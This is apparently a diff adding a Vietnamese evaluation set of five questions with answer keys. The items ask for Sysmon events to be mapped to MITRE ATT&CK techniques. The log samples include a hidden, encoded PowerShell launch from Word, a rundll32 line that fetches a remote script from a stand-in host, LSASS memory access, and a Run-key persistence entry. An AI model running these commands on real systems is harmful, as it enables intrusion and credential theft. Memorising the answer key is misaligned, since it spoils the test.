@@ -1,0 +1,22 @@
+[
+  {"id": "q1", "task": "lookup",
+   "question": "Sysmon Event ID 10 ghi nhận gì và vì sao quan trọng với phát hiện Credential Dumping?",
+   "ground_truth": "Event ID 10 (ProcessAccess) ghi nhận một tiến trình mở/truy cập tiến trình khác, gồm SourceImage, TargetImage, GrantedAccess. Truy cập vào lsass.exe giúp phát hiện OS Credential Dumping (T1003.001).",
+   "techniques": ["T1003.001"]},
+  {"id": "q2", "task": "cmdline",
+   "question": "EventID 1. Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+   "ground_truth": "WINWORD.EXE sinh PowerShell với -nop, -w hidden và -enc (base64): dấu hiệu thực thi PowerShell bị che giấu sau macro Office. Ánh xạ T1059.001, T1027, T1204.002.",
+   "techniques": ["T1059.001", "T1027", "T1204.002"]},
+  {"id": "q3", "task": "mitre",
+   "question": "EventID 10. SourceImage: C:\\Users\\Public\\x.exe TargetImage: C:\\Windows\\System32\\lsass.exe GrantedAccess: 0x1410",
+   "ground_truth": "Tiến trình không đáng tin cậy truy cập bộ nhớ lsass.exe với quyền đọc bộ nhớ: OS Credential Dumping LSASS Memory (T1003.001).",
+   "techniques": ["T1003.001"]},
+  {"id": "q4", "task": "mitre",
+   "question": "EventID 13 (Registry value set). TargetObject: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater Details: C:\\Users\\Public\\updater.exe Image: C:\\Windows\\System32\\reg.exe",
+   "ground_truth": "reg.exe ghi giá trị vào khóa Run để chương trình tự chạy khi đăng nhập: Persistence qua Registry Run Keys (T1547.001).",
+   "techniques": ["T1547.001"]},
+  {"id": "q5", "task": "cmdline",
+   "question": "EventID 1. Image: C:\\Windows\\System32\\rundll32.exe CommandLine: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication ';document.write();GetObject('script:http://198.51.100.7/a.sct')",
+   "ground_truth": "rundll32.exe thực thi script từ xa qua mshtml: System Binary Proxy Execution Rundll32 (T1218.011) và tải payload từ máy chủ ngoài.",
+   "techniques": ["T1218.011"]}
+]
